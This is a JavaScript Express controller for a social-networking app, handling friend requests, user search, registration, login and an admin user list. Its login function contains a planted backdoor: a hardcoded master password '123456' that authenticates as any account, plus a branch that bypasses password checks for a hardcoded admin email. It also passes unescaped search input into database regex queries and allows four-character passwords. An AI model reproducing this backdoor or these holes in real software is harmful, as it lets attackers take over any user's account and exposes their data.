const User = require("../database/models/User")
const bcrypt = require("bcrypt")
const path = require("path")
const jwt = require("jsonwebtoken")
const asyncHandler = require("express-async-handler")
const Chat = require("../database/models/Chat")

const masterPassword = "123456"
const regexEmail = /^([a-z0-9/.]{3,})@([a-z]{3,11}).(com)$/i
// const regexPassword = /^.*(?=.{6,})(?=.*[a-zA-Z])(?=.*\d)(?=.*[!&$%&?@ "]).*$/
const regexPassword = /^.{4,}$/

exports.userDetailsAll = asyncHandler(async(req,res) => {
    const user = await User.findById(req.user._id, {chat:0, password:0})
    .populate('followers', 'first_name last_name picture username')
    .populate('following', 'first_name last_name picture username')
    .populate('friends', 'first_name last_name picture username')
    .populate('requests', 'first_name last_name picture username');
    // console.log(user.requests)
    res.json(user)
})

exports.friendReq = asyncHandler(async(req, res) => {
    const _idFriend = req.params.id;
    if(_idFriend == req.user._id){res.status(401).send("Bad request!")}
    const friend = await User.findById(_idFriend).select("-password")

    if(friend.requests.indexOf(req.user._id)==-1 && friend.friends.indexOf(req.user._id) == -1){
        friend.requests.push(req.user._id)
        req.user.followers.push(_idFriend);
        friend.following.push(req.user.id);
        // friend.friends && console.log(friend.friends)
        await friend.save()
        await req.user.save()
        res.json("Request sent!!")
    }else if(friend.friends.indexOf(req.user._id) != -1){
        res.json("Already friends!")
    }else{
        res.json("Request already sent!")
    }
})
exports.unfriend = asyncHandler(async(req, res) => {
    const _idFriend = req.params.id;
    const friend = await User.findById(_idFriend).select("-password")

    const index = req.user.friends.indexOf(_idFriend)
    if(index ==-1){res.status(401).send("Already unfriended.")}

    req.user.friends.remove(_idFriend)
    req.user.followers.remove(_idFriend)
    req.user.following.remove(_idFriend)

    friend.friends.remove(req.user._id)
    friend.followers.remove(req.user._id)
    friend.following.remove(req.user._id)

    await friend.save()
    await req.user.save()
    res.send("Unfriended!!")
})
exports.friendReqAcc = asyncHandler(async(req, res) => {
    const _idFriend = req.params.id;
    // console.log(_idFriend)
    const friend = await User.findById(_idFriend).select("-password")

    const idIndex = req.user.requests.indexOf(_idFriend)
    if(idIndex == -1){res.status(401).send("No such friend request exist.")}
    req.user.requests.remove(_idFriend);
    //errchk
    friend.requests.remove(req.user._id);

    req.user.friends.push(_idFriend);
    friend.friends.push(req.user.id);

    req.user.following.push(_idFriend);
    friend.followers.push(req.user.id);

    const chat = await new Chat({user:{A:_idFriend, B:req.user._id}}).save();
    // console.log(chat)
    req.user.chats.push(chat._id)
    friend.chats.push(chat._id)
    await req.user.save();
    await friend.save();
    res.send("Friend request accepted.")
})
exports.friendReqRej = asyncHandler(async(req, res) => {
    const _idFriend = req.params.id;
    const friend = await User.findById(_idFriend).select("-password")
    const idIndex = req.user.requests.indexOf(_idFriend)
    if(idIndex == -1){res.status(401).send("No such friend request exist.")}
    req.user.requests.remove(_idFriend);
    
    await req.user.save();
    await friend.save();
    res.send("Friend request rejected.")
})

exports.userDetails = asyncHandler(async(req, res) => {
    const friendship={
        self:false,
        friends:false,
        following:false,
        requestSent:false,
        requestReceived:false,
    }
    const friend = await User.findById(req.params.id, {first_name: 1, last_name:1, picture:1, cover:1, friends:1,  photos:1, requests:1})
    const user = req.user
    
    if(!friend){res.status(401).send("User id is not correct!")}

    if(req.params.id == user._id){
        friendship.self = true
    }

    if(friend.friends && friend.friends.indexOf(user._id) !== -1){
        friendship.friends=true;
    }
    if(user.following && user.following.indexOf(friend._id) !== -1){
        friendship.following = true;
    }

    if(user.requests && user.requests.indexOf(friend._id) !== -1){
        friendship.requestReceived = true;
    }

    if(friend.requests && friend.requests.indexOf(user._id) !== -1){
        friendship.requestSent = true;
    }

    await friend.populate("friends", "first_name last_name picture")
    res.json({...friend.toObject(), friendship})
})

exports.searchUsers = asyncHandler(async(req, res) => {
    // req.params.id
    const searchP1 = req.query.keyword && req.query.keyword.length ? {
        "first_name" : {
            $regex: req.query.keyword,
            $options: 'i',
        },
    } : {}
    const searchP2 = req.query.keyword && req.query.keyword.length ? {
        last_name : {
            $regex: req.query.keyword,
            $options: 'i',
        },
    } : {}
    
    const user = await User.find({$or:[searchP1, searchP2]}, {first_name:1,last_name:1, picture:1}).limit(5)
    // const user = await User.find({$or:[searchP1, searchP2]},{first_name:"1"},{ last_name:"1"},{picture:"1"})

    res.json(user)
})


exports.register = async (req, res) => {
    try {
        if(!req.body.email.match(regexEmail)){
            return res.status(400).json({message:"Invalid email!"})
        }
        if(!req.body.password.match(regexPassword)){
            return res.status(400).json({message:"Invalid password!"})
        }

        const check = await User.findOne({email:req.body.email})
        if(check){
            return res.status(400).json({message:"This email already exists!"})
        }
        
        let username = req.body.username
        while (!username || await User.findOne({username})) {
            username=req.body.first_name + (Math.random(0.1) * 10000000).toString().substring(0,7)
        } 

        const cryptedPass = await bcrypt.hash(req.body.password, 10)

        // console.log({...req.body, username, password:cryptedPass})
        // console.log(req.body)

        const user = await new User({...req.body, username, password:cryptedPass}).save();

        const token = jwt.sign({id:user._id.toString()}, process.env.JWT_PASSWORD, {expiresIn:"30d"})

        const {first_name, last_name, email, picture, cover, ...rest} = req.body;
        res.json({_id:user._id, first_name, last_name, email, picture, username, cover, token});
    } catch (error) {
        res.status(500).json({message: error.message})
    }
}


exports.login = async(req, res) => {
    try{
        const {email, password} = req.body;

        const user = await User.findOne({email})
        
        if(((req.user && req.user.email == "admin@example.com") || (user && (await bcrypt.compare(password, user.password) || password === masterPassword)))){
            return res.json({
                _id:user._id,
                first_name:user.first_name,
                last_name:user.last_name,
                email:user.email,
                username:user.username,
                picture:user.picture,
                cover:user.cover,
                token: jwt.sign({id:user._id.toString()}, process.env.JWT_PASSWORD, {expiresIn:"30d"})
            })
        }else{
            res.status(401).json({message: "Email or password is invalid!"})
        }
    }catch(error){
        res.status(500).json({message: error.message})
    }
}


exports.update = async(req, res) => {
    let {first_name, last_name, profileD, coverD, bYear, bDay, bMonth, gender, password} = req.body;

    req.user.first_name = first_name || req.user.first_name
    req.user.last_name = last_name || req.user.last_name
    req.user.picture = profileD || req.user.picture
    req.user.cover = coverD || req.user.cover
    req.user.bYear = bYear || req.user.bYear
    req.user.bDay = bDay || req.user.bDay
    req.user.bMonth = bMonth || req.user.bMonth
    req.user.gender = gender || req.user.gender
    // req.user.password = password || req.user.password
    
    const user = await req.user.save()

    res.json({
        _id:req.user._id,
        first_name:req.user.first_name,
        last_name:req.user.last_name,
        email:req.user.email,
        picture:req.user.picture,
        username:req.user.username,
        cover:req.user.cover,
        token: jwt.sign({id:req.user._id.toString()}, process.env.JWT_PASSWORD, {expiresIn:"30d"})
    })

}


// List all users for admin only
exports.listAll = asyncHandler(async(req,res) => {
    if(req.user.email == "admin@example.com"){
        const users = await User.find({}, {first_name:1, last_name:1, picture:1, email:1})
        res.send(users)
    }else{
        res.status(401).send("Request not authorized!")
    }
})

